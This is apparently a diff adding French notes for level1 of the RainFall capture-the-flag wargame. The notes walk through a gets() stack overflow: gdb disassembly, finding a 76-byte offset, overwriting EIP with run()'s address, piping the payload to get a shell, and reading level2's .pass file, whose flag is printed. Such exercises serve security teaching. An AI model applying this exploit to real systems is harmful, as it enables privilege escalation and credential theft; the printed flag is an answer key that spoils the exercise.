@@ -1,0 +1,76 @@
+-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1*
+
+level1@RainFall:~$ ./level1 
+sad
+
+le bin recup une string en input
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048480 <+0>:     push   %ebp
+   0x08048481 <+1>:     mov    %esp,%ebp
+   0x08048483 <+3>:     and    $0xfffffff0,%esp
+   0x08048486 <+6>:     sub    $0x50,%esp
+   0x08048489 <+9>:     lea    0x10(%esp),%eax
+   0x0804848d <+13>:    mov    %eax,(%esp)
+   0x08048490 <+16>:    call   0x8048340 <gets@plt>
+   0x08048495 <+21>:    leave  
+   0x08048496 <+22>:    ret    
+
+Il semblerait que le script ne fasse rien d'autre que gets
+
+gets - get a string from standard input (DEPRECATED)
+
+DESCRIPTION
+	Never use this function.
+
+	gets()  reads a line from stdin into the buffer pointed to by s until either a terminat‐
+	ing newline or EOF, which it replaces with a null byte  ('\0').   No  check  for  buffer
+	overrun is performed (see BUGS below).
+
+BUGS
+	Never use gets().  Because it is impossible to tell without knowing the data in  advance
+	how  many characters gets() will read, and because gets() will continue to store charac‐
+	ters past the end of the buffer, it is extremely dangerous to use.  It has been used  to
+	break computer security.
+
+=> Possibilité
+Gets n'est pas protégé face à un overflow donc on peut y passer un shellcode
+=> Pas besoin, run() fait un appel systeme
+
+0x8048444 <run>
+
+=> Provoquer un overflow sur gets et injecter l'addrese de run dans EIP
+
+0x08048486 <+6>:     sub    $0x50,%esp
+=> Buffer de 80 octet
+80 ne segault pas donc alignement a prendre en compte
+
+Segfault:
+80 => AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+eip 0x41414141 -> 4 octets
+
+76 => AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+EIP est intact donc l'addr de run() doit etre a la suite
+l'address doit etre en little endian
+0x8048444 -> \44\84\04\08
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08
+
+Pour interpreter \x44\x84\x04\x08 comme un octet, il faut utiliser python ou echo -e
+
+level1@RainFall:~$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08" > /tmp/sad
+level1@RainFall:~$ cat /tmp/sad 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD�
+
+level1@RainFall:~$ cat /tmp/sad | ./level1 
+Good... Wait what?
+Segmentation fault (core dumped)
+
+=> Bloquer le shell => cat - => pour lire en stdin
+
+level1@RainFall:~$ cat /tmp/sad - | ./level1 
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
